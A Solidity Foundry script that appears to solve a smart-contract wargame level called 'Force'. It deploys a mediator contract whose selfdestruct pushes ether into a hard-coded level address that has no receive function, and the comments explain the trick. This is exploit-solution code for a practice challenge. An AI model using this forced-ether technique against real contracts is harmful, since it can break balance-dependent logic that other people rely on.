// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {ForceMediator} from "../src/Force.sol";

contract ForceScript is Script {
    function run() external {

        // the level contract is compiled with solidity 0.8.0
        // it have no fallback and receive function , so that call send/transfer/call to it will be reverted
        // the only way is to use another contact's selfdestructor function to send to level contract 
        address level = 0x064C114AD72A5A7Ce94628F15E356Dd79d2Cf3aC;

        vm.startBroadcast();
        ForceMediator mediator = new ForceMediator();
        mediator.selfKill{value:0.001 ether}(level);
        vm.stopBroadcast();
        
        console.log("the level's balance is : ");
        console.log(level.balance);
    }
}